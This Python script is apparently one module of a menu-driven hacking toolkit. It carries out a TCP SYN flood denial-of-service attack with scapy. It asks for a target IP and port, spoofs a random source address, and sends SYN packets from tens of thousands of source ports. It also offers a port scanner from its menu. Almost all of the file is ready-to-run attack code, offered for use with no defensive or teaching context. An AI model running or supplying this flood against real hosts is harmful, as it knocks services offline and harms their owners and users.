import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import os
import sys
import time
import signal
import random 
import socket
import struct

os.system('clear')
print "\n\n\n\033[1m\033[36m            SYN-FLOOD-ATTACK\033[0;0m\n"


try:
    sys.stdout.write("            [*]\033[94m Internet Connection Status      \033[0:0m:")
    sys.stdout.flush()
    if socket.gethostbyname('www.google.com'):
        sys.stdout.write("\033[92m     CONNECTED\033[0;0m\n")

except:
    sys.stdout.write("\033[91m     NOT CONNECTED\033[0;0m\n")
    sys.stdout.write("            [-]\033[91mPlease Check Your Internet Connection!\033[0;0m\n")
    time.sleep(2)
    sys.exit()


def Random():
    r = random.randint(1000,9000)
    return r

def SynFlood():
    try:
        try:
            target_ip = raw_input("\n            Enter Taget IP OR URL: ")
            target_port = int(raw_input("            Enter target port number to attack: "))
        except:
            print "\n            \033[91mINVALID\033[0;0m Input, Please Try Again!"
            SynFlood()

        sys.stdout.write("\n            [*] Sending SYN Packets!!     :     ")
        sys.stdout.flush()
        src_ip = socket.inet_ntoa(struct.pack('>I',random.randint(1, 0xffffffff)))
        totalports = 64510.0
        port = 0.0
    
        for src_port in range(1024,65535):
            if port > 0:
                progress = (port/totalports)*100
                sys.stdout.write("\r            				"+str(float("%.8f"%progress))+" %")
                sys.stdout.flush()
            seq = Random()
            window = Random()

            L3_Packet = IP()
            L3_Packet.src = src_ip
            L3_Packet.dst = target_ip
            
            L4_Packet = TCP()
            L4_Packet.sport = src_port
            L4_Packet.dport = target_port
            L4_Packet.flags = "S"
            L4_Packet.seq = seq
            L4_Packet.window = window
        
            Packet = L3_Packet/L4_Packet
            
	    try:
                send(Packet, verbose = 0)
                port = port + 1
            except:
                print "            Error Sending Packets!"
		break
                Options()

        sys.stdout.write("            [+] Packets Sent!!")

        try:
            i = input ("\nPress ENTER To Get Back To Main Menu!")
        except:
            os.system('clear; python main/MainWindow.py')
    except Exception:
        print "            TCP-SYN-ATTACK Failed, Try Again"
        Options()

def Options():
    print "\n\033[1m\033[95m            Enter Your Choice\033[0;0m\n\n            1) List Open Ports On Target  \n            2) TCP-SYN-Flood Attack  \n            3)\033[91m EXIT\033[0;0m"

    try:
        inp=int(raw_input("\n            Choice> "))
    
        if inp==1:
            os.system('clear; python main/Multithreaded_Portscanner.py')
            time.sleep(1)
            Options()
        elif inp==2:
            SynFlood()
        elif inp==3:
            print "\n            \033[91mEXITING\033[0;0m Back To Main Menu..."
            time.sleep(2)
            os.system('python main/MainWindow.py')
        else:
            print "\n            Enter a Valid Input"
            Options()
    except:
        print '\n'
        os.system('clear')
        print "\n            \033[91mINVALID\033[0;0m Input, Please Try Again!"
        Options()

Options()

    
